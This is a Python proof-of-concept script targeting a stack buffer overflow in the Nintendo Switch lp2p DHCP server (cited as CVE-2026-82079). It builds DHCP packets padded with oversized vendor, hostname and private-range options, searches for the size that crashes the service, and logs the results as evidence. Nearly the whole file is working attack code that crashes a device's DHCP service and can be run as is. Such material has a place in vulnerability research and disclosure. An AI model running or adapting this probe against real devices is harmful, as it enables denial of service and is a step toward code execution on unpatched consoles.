#!/usr/bin/env python3
"""
CVE-2026-82079 — lp2p DHCP Server Stack Buffer Overflow Probe

Target: Nintendo Switch lp2p DHCP server (ldn sysmodule)
Bug: DHCP server copies frame data to stack without size validation
Ref: H1:3770768, moehw, fixed in FW 23.0.0

The Switch's lp2p DHCP server starts during CreateGroup (AP creation).
When a client sends a DHCP DISCOVER/REQUEST, the server processes
the packet and copies option data to a stack buffer. If the total
option data exceeds the buffer, the stack is overwritten.

This script probes for the exact overflow boundary using binary search
on DHCP option sizes. DHCP options are TLV: type(1) + length(1) + value(≤255).
A single option maxes at 255 bytes, but multiple options can overflow.

IMPORTANT: The lp2p DHCP lease time is 5 seconds with 0 renewal.
This means the server expects frequent DHCP traffic.

Usage:
    1. Put Switch in "Send to Smartphone" mode (Album → Share)
    2. Connect PC to the switch_* WiFi AP
    3. Run: sudo python3 -I lp2p_dhcp_overflow.py --iface <wifi-iface>

Evidence saved to ../evidence/lp2p_dhcp/
"""

import socket
import struct
import random
import time
import json
import sys
import argparse
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68
SWITCH_IP = "192.168.0.1"


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def random_mac() -> bytes:
    mac = bytearray(6)
    mac[0] = 0x02
    for i in range(1, 6):
        mac[i] = random.randint(0, 255)
    return bytes(mac)


def get_iface_mac(iface: str) -> bytes:
    """Get the real MAC address of the given interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            mac_str = f.read().strip()
        return bytes(int(b, 16) for b in mac_str.split(":"))
    except (FileNotFoundError, ValueError):
        return random_mac()


def mac_str(mac: bytes) -> str:
    return ":".join(f"{b:02x}" for b in mac)


def build_dhcp_packet(mac: bytes, msg_type: int = 1,
                      extra_options: bytes = b"",
                      xid: int | None = None) -> tuple[bytes, int]:
    """Build DHCP packet with custom options appended.

    msg_type: 1=DISCOVER, 3=REQUEST
    extra_options: raw TLV bytes to append before END marker
    """
    if xid is None:
        xid = random.randint(0, 0xFFFFFFFF)

    # BOOTP header (236 bytes)
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)  # broadcast flag
    pkt += b"\x00" * 4  # ciaddr
    pkt += b"\x00" * 4  # yiaddr
    pkt += b"\x00" * 4  # siaddr
    pkt += b"\x00" * 4  # giaddr
    pkt += mac + b"\x00" * 10  # chaddr
    pkt += b"\x00" * 64   # sname
    pkt += b"\x00" * 128  # file

    # Magic cookie
    pkt += b"\x63\x82\x53\x63"

    # Required options
    pkt += bytes([53, 1, msg_type])  # DHCP Message Type
    pkt += bytes([61, 7, 1]) + mac    # Client Identifier
    pkt += bytes([55, 4, 1, 3, 6, 28])  # Parameter Request List

    # Extra options (the overflow payload goes here)
    pkt += extra_options

    # End
    pkt += bytes([255])

    return pkt, xid


def build_overflow_options(total_size: int, fill_byte: int = 0x41) -> bytes:
    """Build DHCP options totaling approximately total_size bytes.

    Uses option 43 (Vendor Specific) which has max 255 bytes per instance,
    plus option 77 (User Class), 60 (Vendor Class ID), 12 (Hostname),
    and custom private options (224-254) to reach the target size.

    Each option: 2-byte header (type + length) + value
    """
    options = b""
    remaining = total_size

    # Use various option codes to pack in data
    # Option 43 (Vendor Specific) — most likely parsed
    # Option 60 (Vendor Class ID)
    # Option 77 (User Class)
    # Option 12 (Hostname) — always parsed
    # Options 224-254 (Private use)
    opt_codes = [43, 60, 77, 12] + list(range(224, 255))

    for opt_code in opt_codes:
        if remaining <= 0:
            break
        # Max 255 bytes per option value
        value_len = min(255, remaining - 2)  # -2 for type+length header
        if value_len <= 0:
            break
        options += bytes([opt_code, value_len]) + bytes([fill_byte] * value_len)
        remaining -= (2 + value_len)

    return options


def send_dhcp(iface: str, pkt: bytes, timeout: float = 3,
              dest: str = "255.255.255.255") -> tuple[bytes | None, float]:
    """Send DHCP packet and wait for response. Returns (response, elapsed).

    dest: target IP. Use broadcast (default) or unicast to SWITCH_IP.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    except PermissionError:
        print("  Need sudo for SO_BINDTODEVICE")
        sock.close()
        return None, 0
    sock.settimeout(timeout)
    t0 = time.monotonic()
    try:
        sock.bind(("0.0.0.0", DHCP_CLIENT_PORT))
        sock.sendto(pkt, (dest, DHCP_SERVER_PORT))
        try:
            data, addr = sock.recvfrom(4096)
            elapsed = time.monotonic() - t0
            return data, elapsed
        except socket.timeout:
            return None, time.monotonic() - t0
    finally:
        sock.close()


def parse_dhcp_msg_type(data: bytes) -> str:
    """Extract DHCP message type from response."""
    cookie = data.find(b"\x63\x82\x53\x63")
    if cookie < 0:
        return "unknown"
    pos = cookie + 4
    while pos < len(data):
        if data[pos] == 255:
            break
        if data[pos] == 0:
            pos += 1
            continue
        if pos + 1 >= len(data):
            break
        opt_type = data[pos]
        opt_len = data[pos + 1]
        if opt_type == 53 and opt_len == 1 and pos + 2 < len(data):
            types = {1: "DISCOVER", 2: "OFFER", 3: "REQUEST", 4: "DECLINE",
                     5: "ACK", 6: "NAK", 7: "RELEASE"}
            return types.get(data[pos + 2], f"type({data[pos + 2]})")
        pos += 2 + opt_len
    return "unknown"


def check_server_alive(iface: str, mac: bytes | None = None) -> bool:
    """Check if the DHCP server is still responding.

    Tries both broadcast and unicast to maximize chance of response.
    Uses the real interface MAC by default (Switch only responds to associated MACs).
    """
    if mac is None:
        mac = get_iface_mac(iface)
    pkt, _ = build_dhcp_packet(mac, msg_type=1)
    # Try broadcast first
    resp, _ = send_dhcp(iface, pkt, timeout=3)
    if resp is not None:
        return True
    # Try unicast to Switch
    resp, _ = send_dhcp(iface, pkt, timeout=3, dest=SWITCH_IP)
    return resp is not None


def probe_overflow_boundary(iface: str):
    """Binary search for the DHCP option size that crashes the server."""
    print("\n" + "=" * 60)
    print("PHASE 1: Exponential search for crash boundary")
    print("=" * 60)

    results = []
    crash_at = None

    # Phase 1: exponential search
    sizes = [64, 128, 256, 512, 1024, 2048, 4096, 7680]
    # 7680 = 30 options × 256 bytes each (max we can pack)

    real_mac = get_iface_mac(iface)
    print(f"  Using MAC: {mac_str(real_mac)}")

    for target_size in sizes:
        extra = build_overflow_options(target_size)
        pkt, xid = build_dhcp_packet(real_mac, msg_type=1, extra_options=extra)

        actual_opt_size = len(extra)
        total_pkt_size = len(pkt)

        resp, elapsed = send_dhcp(iface, pkt)

        entry = {
            "target_option_bytes": target_size,
            "actual_option_bytes": actual_opt_size,
            "total_packet_bytes": total_pkt_size,
            "response": resp is not None,
            "elapsed": round(elapsed, 4),
        }

        if resp:
            msg_type = parse_dhcp_msg_type(resp)
            entry["msg_type"] = msg_type
            print(f"  ✓ opts={actual_opt_size:5d}B pkt={total_pkt_size:5d}B → {msg_type} ({elapsed:.3f}s)")
        else:
            print(f"  ✗ opts={actual_opt_size:5d}B pkt={total_pkt_size:5d}B → NO RESPONSE ({elapsed:.3f}s)")
            # Verify: is the server down or just ignoring?
            time.sleep(1)
            if not check_server_alive(iface, real_mac):
                entry["server_alive"] = False
                entry["possible_crash"] = True
                crash_at = target_size
                print(f"    ⚠ SERVER DOWN — possible crash at {actual_opt_size}B options!")
                # Wait and check if it recovers
                print(f"    Waiting 10s for recovery...")
                time.sleep(10)
                if check_server_alive(iface, real_mac):
                    entry["recovered"] = True
                    print(f"    ✓ Server recovered")
                else:
                    entry["recovered"] = False
                    print(f"    ✗ Server NOT recovered — may need to restart Send to Smartphone")
            else:
                entry["server_alive"] = True
                print(f"    Server still alive — packet was just rejected")

        results.append(entry)
        time.sleep(0.5)

        if crash_at:
            break

    # Phase 2: binary search if we found a crash
    if crash_at and crash_at > sizes[0]:
        prev = sizes[sizes.index(crash_at) - 1] if crash_at in sizes else crash_at // 2
        print(f"\n{'=' * 60}")
        print(f"PHASE 2: Binary search between {prev} and {crash_at} bytes")
        print("=" * 60)

        low, high = prev, crash_at
        while high - low > 32:
            # Need server alive
            if not check_server_alive(iface, real_mac):
                print("  Waiting for server recovery...")
                for _ in range(30):
                    time.sleep(1)
                    if check_server_alive(iface, real_mac):
                        break
                else:
                    print("  Server not recovering. User needs to restart Send to Smartphone.")
                    print(f"  Current boundary: {low}-{high} bytes")
                    break
                time.sleep(1)

            mid = (low + high) // 2
            extra = build_overflow_options(mid)
            pkt, xid = build_dhcp_packet(real_mac, msg_type=1, extra_options=extra)

            resp, elapsed = send_dhcp(iface, pkt)

            entry = {
                "target": mid,
                "actual_option_bytes": len(extra),
                "response": resp is not None,
                "phase": "binary_search",
            }

            if resp:
                low = mid
                entry["result"] = "survived"
                print(f"  ✓ opts={len(extra):5d}B → OK, search [{mid}, {high}]")
            else:
                time.sleep(1)
                if not check_server_alive(iface, real_mac):
                    high = mid
                    entry["result"] = "crashed"
                    print(f"  ✗ opts={len(extra):5d}B → CRASH, search [{low}, {mid}]")
                    time.sleep(5)  # Let it recover
                else:
                    low = mid
                    entry["result"] = "rejected"
                    print(f"  ~ opts={len(extra):5d}B → rejected (not crash), search [{mid}, {high}]")

            results.append(entry)

        print(f"\n  ═══ BUFFER BOUNDARY: {low}–{high} bytes of option data ═══")

    summary = {
        "test": "lp2p_dhcp_overflow_probe",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": f"{SWITCH_IP} lp2p DHCP server",
        "cve": "CVE-2026-82079",
        "crash_at_option_bytes": crash_at,
        "results": results,
    }

    path = evidence_dir() / "overflow_boundary.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    print(f"\nSaved: {path}")
    return summary


def probe_specific_options(iface: str):
    """Test which specific DHCP options trigger the overflow."""
    print("\n" + "=" * 60)
    print("PHASE 3: Per-option overflow test")
    print("=" * 60)
    print("Testing each option at max size (255 bytes) individually")

    # Options the DHCP server is most likely to parse and copy
    target_options = [
        (12, "Hostname"),
        (43, "Vendor Specific"),
        (60, "Vendor Class ID"),
        (61, "Client Identifier"),
        (77, "User Class"),
        (81, "FQDN"),
        (82, "Relay Agent Info"),
        (55, "Parameter Request List"),
        (57, "Max Message Size"),
        (50, "Requested IP"),
        (54, "Server Identifier"),
    ]
    results = {}
    real_mac = get_iface_mac(iface)
    print(f"  Using MAC: {mac_str(real_mac)}")

    for opt_code, opt_name in target_options:
        if not check_server_alive(iface, real_mac):
            print(f"  Server down, waiting...")
            time.sleep(10)
            if not check_server_alive(iface, real_mac):
                print(f"  Server not recovering. Stopping.")
                break

        mac = real_mac
        # Build a single max-size option
        if opt_code == 61:
            # Client ID needs hardware type prefix
            value = bytes([1]) + bytes([0x42] * 254)
        elif opt_code in (50, 54):
            # IP address options are 4 bytes
            value = bytes([192, 168, 0, 100])
        elif opt_code == 57:
            # Max message size is 2 bytes
            value = struct.pack("!H", 65535)
        else:
            value = bytes([0x42] * 255)

        extra = bytes([opt_code, len(value)]) + value
        pkt, _ = build_dhcp_packet(mac, extra_options=extra)
        resp, elapsed = send_dhcp(iface, pkt)

        result = {
            "option": opt_code,
            "name": opt_name,
            "value_size": len(value),
            "response": resp is not None,
            "elapsed": round(elapsed, 4),
        }

        if resp:
            result["msg_type"] = parse_dhcp_msg_type(resp)
            print(f"  ✓ opt {opt_code:3d} ({opt_name:20s}) = {len(value):3d}B → {result['msg_type']}")
        else:
            time.sleep(1)
            alive = check_server_alive(iface)
            result["server_alive"] = alive
            if not alive:
                result["possible_crash"] = True
                print(f"  ✗ opt {opt_code:3d} ({opt_name:20s}) = {len(value):3d}B → CRASH!")
                time.sleep(5)
            else:
                print(f"  ~ opt {opt_code:3d} ({opt_name:20s}) = {len(value):3d}B → rejected")

        results[str(opt_code)] = result
        time.sleep(0.3)

    path = evidence_dir() / "per_option.json"
    with open(path, "w") as f:
        json.dump({"test": "per_option_overflow", "results": results,
                    "timestamp": datetime.now(timezone.utc).isoformat()}, f, indent=2)
    print(f"\nSaved: {path}")
    return results


def probe_combined_options(iface: str):
    """Test combinations of large options to find the exact overflow recipe."""
    print("\n" + "=" * 60)
    print("PHASE 4: Combined option overflow")
    print("=" * 60)
    print("Sending multiple max-size options to exceed stack buffer")

    results = []
    real_mac = get_iface_mac(iface)
    print(f"  Using MAC: {mac_str(real_mac)}")

    for num_options in range(1, 32):
        if not check_server_alive(iface, real_mac):
            print(f"  Server down, waiting...")
            time.sleep(10)
            if not check_server_alive(iface, real_mac):
                break

        mac = real_mac
        extra = b""
        # Use private-range options (224-254) which are least likely to be rejected
        for i in range(num_options):
            opt_code = 224 + (i % 31)
            extra += bytes([opt_code, 255]) + bytes([0x41 + i] * 255)

        pkt, _ = build_dhcp_packet(mac, extra_options=extra)
        resp, elapsed = send_dhcp(iface, pkt)

        total_opt_bytes = len(extra)
        total_pkt_bytes = len(pkt)

        entry = {
            "num_options": num_options,
            "total_option_bytes": total_opt_bytes,
            "total_packet_bytes": total_pkt_bytes,
            "response": resp is not None,
            "elapsed": round(elapsed, 4),
        }

        if resp:
            print(f"  ✓ {num_options:2d} opts = {total_opt_bytes:5d}B → OK")
        else:
            time.sleep(1)
            alive = check_server_alive(iface)
            entry["server_alive"] = alive
            if not alive:
                entry["possible_crash"] = True
                print(f"  ✗ {num_options:2d} opts = {total_opt_bytes:5d}B → CRASH! (pkt={total_pkt_bytes}B)")
                time.sleep(5)
                results.append(entry)
                break
            else:
                print(f"  ~ {num_options:2d} opts = {total_opt_bytes:5d}B → rejected")

        results.append(entry)
        time.sleep(0.3)

    path = evidence_dir() / "combined_options.json"
    with open(path, "w") as f:
        json.dump({"test": "combined_option_overflow", "results": results,
                    "timestamp": datetime.now(timezone.utc).isoformat()}, f, indent=2)
    print(f"\nSaved: {path}")
    return results


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-82079 lp2p DHCP Server Overflow Probe")
    parser.add_argument("--iface", required=True,
                        help="WiFi interface connected to Switch AP")
    parser.add_argument("--phase", choices=["boundary", "per-option", "combined", "all"],
                        default="all", help="Which phase to run")
    args = parser.parse_args()

    print("╔══════════════════════════════════════════════════════════╗")
    print("║  CVE-2026-82079 — lp2p DHCP Stack Overflow Probe       ║")
    print("║  Target: Nintendo Switch ldn sysmodule DHCP server      ║")
    print("║  Ref: H1:3770768 (moehw)                               ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"Interface: {args.iface}")
    print(f"Time: {datetime.now(timezone.utc).isoformat()}")
    print("-" * 60)

    real_mac = get_iface_mac(args.iface)
    print(f"Our MAC: {mac_str(real_mac)}")
    if not check_server_alive(args.iface, real_mac):
        print("✗ DHCP server not responding.")
        print("  1. Put Switch in Album → Send to Smartphone mode")
        print("  2. Connect this PC to the switch_* WiFi AP")
        print("  3. Ensure you have sudo privileges")
        sys.exit(1)
    print("✓ DHCP server alive — received OFFER")

    if args.phase in ("boundary", "all"):
        probe_overflow_boundary(args.iface)
    if args.phase in ("per-option", "all"):
        probe_specific_options(args.iface)
    if args.phase in ("combined", "all"):
        probe_combined_options(args.iface)

    print("\n" + "=" * 60)
    print("All probes complete. Check evidence/lp2p_dhcp/")
    print("=" * 60)


if __name__ == "__main__":
    main()
